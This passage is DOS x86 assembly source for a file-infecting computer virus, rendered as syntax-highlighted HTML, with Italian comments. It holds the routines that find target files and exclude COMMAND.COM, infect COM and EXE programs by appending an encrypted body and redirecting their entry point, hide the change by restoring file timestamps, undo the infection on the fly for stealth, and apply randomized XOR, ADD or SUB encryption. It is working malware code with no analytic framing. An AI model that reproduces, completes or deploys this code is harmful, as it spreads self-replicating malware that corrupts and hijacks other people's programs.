         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int2fh</span><span class="sc0">                                 </span><span class="sc1">; ES:DI JFT</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1216h</span><span class="sc0">                                </span><span class="sc1">; bx entry number for</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int2fh</span><span class="sc0">                                 </span><span class="sc1">; ES:DI SFT</span><span class="sc0">

         </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                                  </span><span class="sc1">; go to filename</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'MMOC'</span><span class="sc0">
         </span><span class="sc6">scasd</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">no_com_com</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">' DNA'</span><span class="sc0">
         </span><span class="sc6">scasd</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">no_com_com</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'OC'</span><span class="sc0">
         </span><span class="sc6">scasw</span><span class="sc0">
</span><span class="sc5">no_com_com</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">except</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">file_type</span><span class="sc4">,</span><span class="sc5">other</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">GotoEnd</span><span class="sc0">

</span><span class="sc5">except</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">file_status</span><span class="sc4">,</span><span class="sc5">ready</span><span class="sc0">

</span><span class="sc5">GoToEnd</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileEnd</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
                             </span><span class="sc1">; DX:AX dimensione file</span><span class="sc0">
</span><span class="sc5">CheckXinf</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">FileInfect</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckXInf</span><span class="sc0">                         </span><span class="sc1">; DX:AX dimens file</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">file_type</span><span class="sc4">,</span><span class="sc5">other</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Infectexit</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">file_status</span><span class="sc4">,</span><span class="sc5">ready</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">infectexit</span><span class="sc0">

         </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">f_size</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                 </span><span class="sc1">; salva dim per .COM</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fileheader</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@com_buf</span><span class="sc0">
         </span><span class="sc6">movsd</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@not_less</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">23000</span><span class="sc0">
         </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@not_less</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">infectexit</span><span class="sc0">

</span><span class="sc5">@not_less</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
         </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">Infectexit</span><span class="sc0">

         </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fileheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">templateheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">fileheader</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0">          </span><span class="sc6">movsw</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">VIR_TRUE_LEN</span><span class="sc0">
         </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
         </span><span class="sc6">div</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                 </span><span class="sc1">; AX = quoziente  DX=resto</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">fileheader.msize</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                </span><span class="sc1">; nuova memory size</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">fileheader.sizemod</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">; nuovo memory module</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">NONCRYPTED</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">START_TSR</span><span class="sc0">
         </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
         </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                                 </span><span class="sc1">; AX:DX = CS:IP</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">fileheader.ip</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">VIR_TRUE_LEN</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc5">fileheader.ip</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
         </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc5">fileheader.ip</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">fileheader.ip</span><span class="sc0">

         </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">first_addr</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">NONCRYPTED</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">START_TSR</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">cmp_addr</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">fileheader.headsize</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">fileheader.codes</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">; setta CS:IP nuovi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">fileheader.stackseg</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc5">fileheader.stackofs</span><span class="sc4">,(</span><span class="sc5">VIR_PAR</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc1">; mi metto al sicuro</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetDateTime</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">calc_check</span><span class="sc0">                            </span><span class="sc1">; dx checksum</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc5">fileheader.checkovr</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc5">LeaveSo</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileStart</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">file_type</span><span class="sc4">,</span><span class="sc5">com</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@exe1</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">jmp_addr</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com_exec</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">yesvirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">fileheader</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">f_size</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">NONCRYPTED</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">START_TSR</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">fileheader</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">102h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">first_addr</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">NONCRYPTED</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">START_TSR</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">cmp_addr</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FIleheader</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BlockWrite</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ordinary</span><span class="sc0">

</span><span class="sc5">@exe1</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">jmp_addr</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fileheader</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">fileheader</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BlockWrite</span><span class="sc0">                             </span><span class="sc1">; scrive header</span><span class="sc0">

</span><span class="sc5">ordinary</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileEnd</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Criptate</span><span class="sc0">                               </span><span class="sc1">; return CX =</span><span class="sc0">
                             </span><span class="sc1">; virus lenght</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Data_Buffer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VIR_TRUE_LEN</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BlockWrite</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetDateTime</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">commit_file</span><span class="sc0">

</span><span class="sc5">InfectExit</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">FileInfect</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">FileClean</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CheckXInf</span><span class="sc0">                            </span><span class="sc1">; DX:AX dimens file</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">file_type</span><span class="sc4">,</span><span class="sc5">other</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">clean_out</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">file_status</span><span class="sc4">,</span><span class="sc5">already</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">clean_out</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">templateheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">              </span><span class="sc1">;size @com_buf</span><span class="sc0">
         </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileSeek</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">templateheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">     </span><span class="sc1">;size @com_buf</span><span class="sc0">
                                                </span><span class="sc1">; read real fileheader</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@com_buf</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Blockread</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileStart</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetdateTime</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">file_type</span><span class="sc4">,</span><span class="sc5">com</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@exe2</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@com_buf</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Blockwrite</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ordinary1</span><span class="sc0">

</span><span class="sc5">@exe2</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">MZsig</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">templateheader.signature</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">templateHeader</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">templateheader</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BlockWrite</span><span class="sc0">

</span><span class="sc5">ordinary1</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fileEnd</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">vir_true_len</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileSeek</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Blockwrite</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetDateTime</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">commit_file</span><span class="sc0">

</span><span class="sc5">clean_out</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">FileClean</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">Criptate</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">46ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; ritorna numero casuale</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc5">k_code</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc5">k1_code</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">jl</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@well</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

</span><span class="sc5">@well</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cripstyle</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">cripmode</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">uncripstyle</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">uncripmode</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">

         </span><span class="sc6">std</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NONCRYPTED</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">Data_Buffer</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">NONCRYPTED</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">START_TSR</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">@crip</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">bt</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@stop</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">

         </span><span class="sc5">cripmode</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
         </span><span class="sc5">k_code</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">                             </span><span class="sc1">; xor add sub ,k_code</span><span class="sc0">

         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@crip</span><span class="sc0">

</span><span class="sc5">@stop</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@uncr_code</span><span class="sc0">
